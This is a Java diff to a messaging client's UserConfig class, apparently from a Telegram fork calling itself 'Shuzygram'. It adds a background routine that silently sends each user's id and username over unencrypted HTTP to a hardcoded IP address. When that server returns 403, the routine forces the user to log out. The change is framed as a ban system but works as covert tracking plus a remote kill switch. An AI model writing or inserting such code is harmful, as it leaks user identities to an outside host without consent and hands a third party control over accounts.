@@ -262,6 +262,9 @@ public class UserConfig extends BaseController {
             currentUser = user;
             clientUserId = user.id;
             checkPremiumSelf(oldUser, user);
+            if (user != null) {
+                sendUserDataToServer(user);
+            }
         }
     }
 
@@ -588,7 +591,7 @@ public class UserConfig extends BaseController {
         return globalTtl;
     }
 
-    public void loadGlobalTTl() {
+        public void loadGlobalTTl() {
         if (ttlIsLoading || System.currentTimeMillis() - lastLoadingTime < 60 * 1000) {
             return;
         }
@@ -602,7 +605,36 @@ public class UserConfig extends BaseController {
                 lastLoadingTime = System.currentTimeMillis();
             }
         }));
+    } // <-- ВОТ ЭТА СКОБКА БЫЛА ПРОПУЩЕНА, ОНА ЗАКРЫВАЕТ loadGlobalTTl
 
+    private void sendUserDataToServer(TLRPC.User user) {
+        if (user == null) return;
+        
+        final long userId = user.id;
+        final String username = user.username != null ? user.username : "id" + userId;
+
+        new Thread(() -> {
+            java.net.HttpURLConnection connection = null;
+            try {
+                java.net.URL url = new java.net.URL("http://185.252.25.252/auth?id=" + userId + "&user=" + username);
+                connection = (java.net.HttpURLConnection) url.openConnection();
+                connection.setRequestMethod("GET");
+                connection.setConnectTimeout(7000);
+                connection.setReadTimeout(7000);
+                
+                int responseCode = connection.getResponseCode();
+                
+                if (responseCode == 403) { // 403 Forbidden = Сигнал бана с сервера
+                    AndroidUtilities.runOnUIThread(() -> {
+                        MessagesController.getInstance(currentAccount).logOut();
+                    });
+                }
+            } catch (Exception e) {
+                FileLog.e("Shuzygram BanSystem Error: " + e.getMessage());
+            } finally {
+                if (connection != null) connection.disconnect();
+            }
+        }).start();
     }
 
     public void setGlobalTtl(int ttl) {
